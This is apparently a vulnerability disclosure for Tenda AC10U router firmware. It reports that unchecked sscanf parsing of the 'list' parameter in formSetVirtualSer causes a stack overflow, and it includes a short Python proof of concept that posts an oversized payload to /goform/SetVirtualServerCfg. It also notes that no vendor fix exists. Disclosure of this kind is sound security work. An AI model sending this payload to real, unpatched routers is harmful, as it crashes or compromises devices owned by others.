# Tenda AC10U v1.0 US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01 was discovered to contain a stack overflow via the list parameter in the formSetVirtualSer function.

## Vulnerability Description

Vendor: Tenda

Product: AC10U

Version: US_AC10UV1.0RTL_V15.03.06.49_multi_TDE01

Type: Buffer Overflow

Firmware link: https://www.tendacn.com/download/detail-3795.html

## Vulnerability Details

The function "formSetVirtualSer" retrieves the parameter "list" using "websGetVar" and passes it to the function "save_virtualser_data" without undergoing any length checks.

![1705402785915](image/formSetVirtualSer/1705402785915.png)

In the "save_virtualser_data" function, the value of "list" (referred to as "buf") is formatted using the sscanf function with the format "%[^,]%*c%[^,]%*c%[^,]%*c%s". This greedy matching mechanism is insecure, as it can cause a stack overflow if the size of the data we enter exceeds the size of "lan_ip", "in_port", "out_port", or "protocol".

![1705402900780](image/formSetVirtualSer/1705402900780.png)

## **Recurring vulnerabilities and POC**

```python
import requests
ip = '192.168.159.128'
url = f'http://{ip}/goform/SetVirtualServerCfg'
payload = {
    "list": 'a'*0x500
}
res = requests.post(url=url, data=payload)
print(res.content)
```

## Solution

The vendor has not yet provided a fix for the vulnerability, please watch the vendor's homepage for updates:
https://www.tendacn.com/product/specification/ac10u.html
